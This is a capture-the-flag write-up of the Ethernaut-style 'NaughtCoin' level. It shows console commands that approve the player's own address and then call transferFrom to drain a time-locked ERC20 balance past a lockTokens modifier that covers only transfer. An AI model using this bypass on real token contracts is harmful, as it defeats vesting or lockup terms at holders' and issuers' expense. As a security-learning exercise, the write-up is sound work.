# NaughtCoin

# Problem Statement
```
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

Things that might help
- The ERC20 Spec
- The OpenZeppelin codebase
```

# Solution

First check the `player` token balances and allowances.
```
Number(await contract.balanceOf(player))
// returns 1000000000000000000000000
Number(await contract.allowance(player, player))
// returns '0'
```
This means the player address itself does not have allowance to spend their own tokens. So give the approval access to the player address.
```
await contract.approve(player, '1000000000000000000000000')
Number(await contract.allowance(player, player))
// now returns 1000000000000000000000000
```
The key thing to note is that the NaughtCoin contract did not implement certain functions specifically the `approval`, `transferFrom`, and allowance methods with the `lockTokens` modifier checker. Because of this the attacker can use the combination of approval+transferFrom to transfer them out of the contract.
```
await contract.transferFrom(player, "0xANY_ADDRESS", '1000000000000000000000000')
```

We've completed this lesson!

# Key Learnings
- When interfacing with contracts or implementing an ERC interface, implement all available functions if possible.
